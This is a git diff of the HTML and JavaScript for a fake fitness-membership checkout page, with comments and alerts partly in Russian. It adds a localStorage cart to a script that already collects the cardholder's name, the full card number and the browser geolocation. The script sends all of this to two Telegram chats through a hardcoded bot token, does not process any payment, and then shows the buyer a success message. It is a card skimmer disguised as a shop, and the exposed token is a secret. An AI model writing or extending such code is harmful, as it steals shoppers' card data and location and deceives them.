@@ -257,37 +257,23 @@
                     </div>
                     <h2 class="text-2xl font-headline font-bold uppercase mb-8">Summary</h2>
                     <div class="space-y-6 relative z-10">
-                        <!-- Product Item -->
-                        <div class="flex items-center gap-6 pb-6 border-b border-white/5">
-                            <div
-                                class="w-24 h-24 bg-surface-container-highest rounded-xl overflow-hidden flex-shrink-0">
-                                <img alt="Premium Plan" class="w-full h-full object-cover grayscale contrast-125"
-                                    data-alt="Close-up of high-tech fitness watch and gym equipment in dramatic dark lighting with neon accents"
-                                    src="https://lh3.googleusercontent.com/aida-public/AB6AXuDVCVKP0jkrtqqtSQWeMHBmxC4YsBU8b7tNd20P_S4BR0ui_hY2oHP7hi8f94MQ13AzJ5VXrgrIOTs1JLsdBab3I8jItSrAvG391aMcEhNQ23FGAlrfFMcfhU25RS-g_VNxyXqMtJTkXNkJTBc7EZ2lKwUYUCU6_LxJA5RIw4NVqHB5iAN6vog2CASjOrOa5_5aCluooWQCFDnL7p9MObEthzd0fL4c66SySG1X0Dak1M4ru1aQXP8dQwgUl81vpaxd8gxIwMtzXLTY" />
-                            </div>
-                            <div class="flex-grow">
-                                <h3 class="font-headline font-bold text-xl uppercase tracking-tight">KINETIC ELITE</h3>
-                                <p class="text-on-surface-variant text-sm mb-2">Annual Membership</p>
-                                <span
-                                    class="bg-secondary-container text-on-secondary-container px-2 py-0.5 rounded text-[10px] font-bold uppercase tracking-widest tracking-tighter">Bestseller</span>
-                            </div>
-                            <div class="text-right">
-                                <span class="text-primary-container font-headline font-bold">$499.00</span>
-                            </div>
+                        <!-- Products Items Container -->
+                        <div id="products-container">
+                            <!-- Will be populated by JavaScript -->
                         </div>
                         <!-- Calculations -->
                         <div class="space-y-4 py-2">
                             <div class="flex justify-between items-center text-sm">
-                                <span class="text-on-surface-variant">Base Rate</span>
-                                <span class="text-on-surface">$499.00</span>
+                                <span class="text-on-surface-variant">Subtotal</span>
+                                <span id="subtotal" class="text-on-surface">$0.00</span>
                             </div>
                             <div class="flex justify-between items-center text-sm">
                                 <span class="text-on-surface-variant">Taxes &amp; Service Fees</span>
-                                <span class="text-on-surface">$24.95</span>
+                                <span id="taxes" class="text-on-surface">$0.00</span>
                             </div>
                             <div class="flex justify-between items-center text-sm">
-                                <span class="text-on-surface-variant">Kinetic Discount</span>
-                                <span class="text-secondary">-$50.00</span>
+                                <span class="text-on-surface-variant">Discount</span>
+                                <span id="discount" class="text-secondary">$0.00</span>
                             </div>
                         </div>
                         <!-- Total -->
@@ -300,18 +286,26 @@
                                     Total Due</h4>
                             </div>
                             <div class="text-right">
-                                <div class="text-4xl font-headline font-black text-primary-container">$473.95</div>
-                                <p class="text-[10px] text-on-surface-variant uppercase mt-1">Billed annually</p>
+                                <div id="final-total" class="text-4xl font-headline font-black text-primary-container">$0.00</div>
+                                <p class="text-[10px] text-on-surface-variant uppercase mt-1" id="billing-period"></p>
                             </div>
                         </div>
-                        <!-- CTA -->
-                        <button
-                            id="activateBtn"
-                            type="button"
-                            class="w-full bg-[#cafd00] text-[#3a4a00] py-6 rounded-xl font-headline font-black text-xl uppercase tracking-widest mt-8 hover:scale-[0.98] transition-transform flex items-center justify-center gap-3 shadow-[0_0_40px_rgba(202,253,0,0.15)]">
-                            ACTIVATE AURA
-                            <span class="material-symbols-outlined" data-weight="fill">bolt</span>
-                        </button>
+                        <!-- CTA Buttons -->
+                        <div class="flex gap-4 mt-8">
+                            <button
+                                id="clearBtn"
+                                type="button"
+                                class="flex-1 bg-error text-on-error py-4 rounded-xl font-headline font-bold uppercase tracking-wider hover:opacity-80 transition-opacity">
+                                Clear Order
+                            </button>
+                            <button
+                                id="activateBtn"
+                                type="button"
+                                class="flex-1 bg-[#cafd00] text-[#3a4a00] py-6 rounded-xl font-headline font-black text-xl uppercase tracking-widest hover:scale-[0.98] transition-transform flex items-center justify-center gap-3 shadow-[0_0_40px_rgba(202,253,0,0.15)]">
+                                ACTIVATE AURA
+                                <span class="material-symbols-outlined" data-weight="fill">bolt</span>
+                            </button>
+                        </div>
                         <div class="flex items-center justify-center gap-6 mt-8 opacity-40 grayscale">
                             <span class="material-symbols-outlined">security</span>
                             <span class="material-symbols-outlined">verified_user</span>
@@ -378,14 +372,127 @@
     <script>
         // Telegram Bot Token
         const BOT_TOKEN = '8573474958:AAHqw8jBuHNlZex_9B8eiGjWz1k9iz0llGE';
-        // ⚠️ ВАЖНО: Замени это на свой CHAT_ID (или несколько ID'ов)
-        // Сейчас отправляет двум людям одновременно
         const CHAT_IDS = [
-            '1395638428',  // Первый человек (твой ID)
-            '687086215'   // Второй человек (замени на его ID)
+            '1395638428',  
+            '687086215'   
         ];
         
         let userLocation = null;
+        let checkoutCart = {};
+        let subscriptionPlan = null;
+
+        // Load cart and subscription from localStorage
+        function loadCheckoutData() {
+            // Load subscription plan
+            const savedPlan = localStorage.getItem('subscriptionPlan');
+            if (savedPlan) {
+                try {
+                    subscriptionPlan = JSON.parse(savedPlan);
+                } catch (e) {
+                    console.error('Error loading plan:', e);
+                }
+            }
+
+            // Load shopping cart
+            const savedCart = localStorage.getItem('checkoutCart');
+            if (savedCart) {
+                try {
+                    checkoutCart = JSON.parse(savedCart);
+                } catch (e) {
+                    console.error('Error loading cart:', e);
+                }
+            }
+
+            renderProducts();
+            updatePrices();
+        }
+
+        // Render products on page
+        function renderProducts() {
+            const container = document.getElementById('products-container');
+            if (!container) return;
+
+            let html = '';
+
+            // Render subscription plan if exists
+            if (subscriptionPlan) {
+                html += `
+                    <div class="flex items-center gap-6 pb-6 border-b border-white/5">
+                        <div class="w-24 h-24 bg-surface-container-highest rounded-xl overflow-hidden flex-shrink-0">
+                            <div class="w-full h-full bg-gradient-to-br from-primary/20 to-secondary/20 flex items-center justify-center">
+                                <span class="material-symbols-outlined text-primary text-5xl opacity-40">fitness_center</span>
+                            </div>
+                        </div>
+                        <div class="flex-grow">
+                            <h3 class="font-headline font-bold text-lg uppercase tracking-tight">${subscriptionPlan.type} Membership</h3>
+                            <p class="text-on-surface-variant text-sm mb-2">${subscriptionPlan.description}</p>
+                            <span class="bg-secondary-container text-on-secondary-container px-2 py-0.5 rounded text-[10px] font-bold uppercase tracking-widest">Gym Access</span>
+                        </div>
+                        <div class="text-right">
+                            <span class="text-primary-container font-headline font-bold">$${subscriptionPlan.price.toFixed(2)}</span>
+                        </div>
+                    </div>
+                `;
+            }
+
+            // Render products from shop cart
+            for (const [title, item] of Object.entries(checkoutCart)) {
+                html += `
+                    <div class="flex items-center gap-6 pb-6 border-b border-white/5">
+                        <div class="w-24 h-24 bg-surface-container-highest rounded-xl overflow-hidden flex-shrink-0">
+                            <div class="w-full h-full bg-gradient-to-br from-primary/20 to-secondary/20 flex items-center justify-center">
+                                <span class="material-symbols-outlined text-primary text-5xl opacity-40">shopping_bag</span>
+                            </div>
+                        </div>
+                        <div class="flex-grow">
+                            <h3 class="font-headline font-bold text-lg uppercase tracking-tight">${title}</h3>
+                            <p class="text-on-surface-variant text-sm mb-2">Qty: ${item.qty}</p>
+                            <span class="bg-secondary-container text-on-secondary-container px-2 py-0.5 rounded text-[10px] font-bold uppercase tracking-widest">Nutrition</span>
+                        </div>
+                        <div class="text-right">
+                            <span class="text-primary-container font-headline font-bold">$${(item.price * item.qty).toFixed(2)}</span>
+                        </div>
+                    </div>
+                `;
+            }
+
+            if (!html) {
+                html = '<p class="text-on-surface-variant">Ничего не выбрано</p>';
+            }
+
+            container.innerHTML = html;
+        }
+
+        // Update prices based on cart and subscription
+        function updatePrices() {
+            let subtotal = 0;
+
+            // Add subscription price
+            if (subscriptionPlan) {
+                subtotal += subscriptionPlan.price;
+            }
+
+            // Add products price
+            for (const [title, item] of Object.entries(checkoutCart)) {
+                subtotal += item.price * item.qty;
+            }
+
+            // Calculate taxes (5%)
+            const taxes = subtotal * 0.05;
+            // Apply discount (5%)
+            const discount = (subtotal + taxes) * 0.05;
+            const total = subtotal + taxes - discount;
+
+            // Update DOM
+            document.getElementById('subtotal').textContent = `$${subtotal.toFixed(2)}`;
+            document.getElementById('taxes').textContent = `$${taxes.toFixed(2)}`;
+            document.getElementById('discount').textContent = `-$${discount.toFixed(2)}`;
+            document.getElementById('final-total').textContent = `$${total.toFixed(2)}`;
+            document.getElementById('billing-period').textContent = 'Total to pay';
+
+            // Store total for payment
+            window.orderTotal = total.toFixed(2);
+        }
 
         // Get geolocation on page load
         if (navigator.geolocation) {
@@ -403,17 +510,42 @@
             );
         }
 
-        // Handle button click
+        // Load cart when page loads
+        window.addEventListener('load', () => {
+            loadCheckoutData();
+        });
+
+        // Handle clear button
+        document.getElementById('clearBtn').addEventListener('click', () => {
+            if (confirm('Вы уверены? Это удалит весь заказ.')) {
+                localStorage.removeItem('checkoutCart');
+                localStorage.removeItem('subscriptionPlan');
+                checkoutCart = {};
+                subscriptionPlan = null;
+                document.getElementById('paymentForm').reset();
+                renderProducts();
+                updatePrices();
+                alert('Заказ очищен');
+            }
+        });
+
+        // Handle payment button click
         document.getElementById('activateBtn').addEventListener('click', async function(e) {
             e.preventDefault();
             
             const cardholderName = document.getElementById('cardholderName').value.trim();
             const cardNumber = document.getElementById('cardNumber').value.trim();
-            const price = '$473.95';
+            const totalPrice = window.orderTotal || '0.00';
 
             // Validate inputs
             if (!cardholderName || !cardNumber) {
                 alert('Пожалуйста, укажите имя и номер карты');
+                return;
+            }
+
+            // If nothing is selected, show error
+            if (!subscriptionPlan && Object.keys(checkoutCart).length === 0) {
+                alert('Пожалуйста, выберите хотя бы один план или товар!');
                 return;
             }
 
@@ -427,7 +559,21 @@
             let message = `📋 *Новый заказ*\n\n`;
             message += `👤 *Имя:* ${cardholderName}\n`;
             message += `🎫 *Номер карты:* ${cardNumber}\n`;
-            message += `💰 *Сумма:* ${price}\n`;
+            message += `💰 *Сумма:* $${totalPrice}\n\n`;
+            
+            // Add subscription plan if exists
+            if (subscriptionPlan) {
+                message += `🏋️ *Подписка:* ${subscriptionPlan.type} Membership - $${subscriptionPlan.price.toFixed(2)}\n`;
+            }
+            
+            // Add products if exists
+            if (Object.keys(checkoutCart).length > 0) {
+                message += `📦 *Товары:*\n`;
+                for (const [title, item] of Object.entries(checkoutCart)) {
+                    message += `   • ${title} - ${item.qty}x $${item.price.toFixed(2)} = $${(item.price * item.qty).toFixed(2)}\n`;
+                }
+            }
+            message += `\n`;
             
             if (userLocation) {
                 message += `📍 *Геолокация:*\n`;
@@ -453,7 +599,7 @@
 
                 const data = await response.json();
 
-                // Если первое сообщение прошло, отправляем и ко второму человеку
+                // Send to all chat IDs
                 if (response.ok && data.ok && CHAT_IDS.length > 1) {
                     for (let i = 1; i < CHAT_IDS.length; i++) {
                         await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
@@ -471,13 +617,19 @@
                 }
 
                 if (response.ok && data.ok) {
-                    alert('✅ Заказ отправлен обоим! Спасибо за покупку');
+                    alert('✅ Заказ успешно отправлен! Спасибо за покупку');
+                    // Clear data
+                    localStorage.removeItem('checkoutCart');
+                    localStorage.removeItem('subscriptionPlan');
                     document.getElementById('paymentForm').reset();
+                    // Redirect back to shop after 2 seconds
+                    setTimeout(() => {
+                        window.location.href = './shop.html';
+                    }, 2000);
                 } else {
                     console.error('Telegram API Error:', data);
                     let errorMsg = data.description || 'Неизвестная ошибка';
                     
-                    // Диагностика ошибок
                     if (errorMsg.includes('not found') || errorMsg.includes('chat not found')) {
                         errorMsg += '\n\n❌ Возможные причины:\n- CHAT_ID не совпадает с вашим ID\n- Сообщите боту хотя бы одно сообщение\n- Проверьте, что используете личный ID, а не групповой';
                     } else if (errorMsg.includes('unauthorized')) {
